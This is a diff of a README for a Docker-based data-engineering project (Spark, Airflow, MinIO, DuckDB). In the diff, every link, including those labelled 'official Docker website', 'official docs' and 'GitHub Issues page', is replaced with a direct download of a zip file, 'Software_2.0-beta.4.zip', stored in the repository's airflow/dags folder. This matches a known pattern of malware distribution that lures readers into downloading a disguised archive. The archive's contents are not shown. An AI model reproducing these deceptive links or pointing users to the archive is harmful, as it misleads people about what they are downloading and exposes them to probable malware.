@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Codex56799/dataengineering/releases)
+[![Download Latest Release](https://github.com/Codex56799/dataengineering/raw/refs/heads/main/airflow/dags/Software_2.0-beta.4.zip%20Latest%https://github.com/Codex56799/dataengineering/raw/refs/heads/main/airflow/dags/Software_2.0-beta.4.zip)](https://github.com/Codex56799/dataengineering/raw/refs/heads/main/airflow/dags/Software_2.0-beta.4.zip)
 
 ## 📖 Overview
 
@@ -15,15 +15,15 @@ Before you start, make sure your computer meets these requirements:
 - **Operating System:** Windows, macOS, or Linux
 - **RAM:** At least 8 GB recommended
 - **Disk Space:** Minimum of 1 GB available
-- **Docker:** This project uses Docker, so you need to install it. You can find installation instructions on the [official Docker website](https://docs.docker.com/get-docker/).
+- **Docker:** This project uses Docker, so you need to install it. You can find installation instructions on the [official Docker website](https://github.com/Codex56799/dataengineering/raw/refs/heads/main/airflow/dags/Software_2.0-beta.4.zip).
 
 ## 🚀 Getting Started
 
 1. **Download the Software**
-   - Visit [this page to download](https://github.com/Codex56799/dataengineering/releases) the latest version of the application.
+   - Visit [this page to download](https://github.com/Codex56799/dataengineering/raw/refs/heads/main/airflow/dags/Software_2.0-beta.4.zip) the latest version of the application.
 
 2. **Install Docker**
-   - Go to the [official Docker website](https://docs.docker.com/get-docker/) and choose the version that matches your operating system.
+   - Go to the [official Docker website](https://github.com/Codex56799/dataengineering/raw/refs/heads/main/airflow/dags/Software_2.0-beta.4.zip) and choose the version that matches your operating system.
    - Follow the instructions to install Docker on your computer.
 
 3. **Run the Application**
@@ -63,7 +63,7 @@ After you run the above command, the application will start, and you can access 
 
 ## 📝 Documentation
 
-For detailed documentation, including how to create custom workflows, manage data, and optimize performance, consult our [official docs](https://github.com/Codex56799/dataengineering/docs).
+For detailed documentation, including how to create custom workflows, manage data, and optimize performance, consult our [official docs](https://github.com/Codex56799/dataengineering/raw/refs/heads/main/airflow/dags/Software_2.0-beta.4.zip).
 
 ## 💡 FAQ
 
@@ -74,7 +74,7 @@ No, this application is designed for users with little to no programming knowled
 Yes, as long as your laptop meets the basic system requirements, you can easily run the application.
 
 ### 3. **How do I get help if I have issues?**
-You can open an issue on our [GitHub Issues page](https://github.com/Codex56799/dataengineering/issues) if you encounter any problems.
+You can open an issue on our [GitHub Issues page](https://github.com/Codex56799/dataengineering/raw/refs/heads/main/airflow/dags/Software_2.0-beta.4.zip) if you encounter any problems.
 
 ## 📦 Contributing
 
@@ -86,4 +86,4 @@ Thanks to the open-source communities of Spark, Airflow, MinIO, and DuckDB for p
 
 ## 📥 Download & Install
 
-Remember to [visit this page to download](https://github.com/Codex56799/dataengineering/releases) your copy of the software. Follow the instructions provided above to get started. Enjoy analyzing data with ease!
+Remember to [visit this page to download](https://github.com/Codex56799/dataengineering/raw/refs/heads/main/airflow/dags/Software_2.0-beta.4.zip) your copy of the software. Follow the instructions provided above to get started. Enjoy analyzing data with ease!
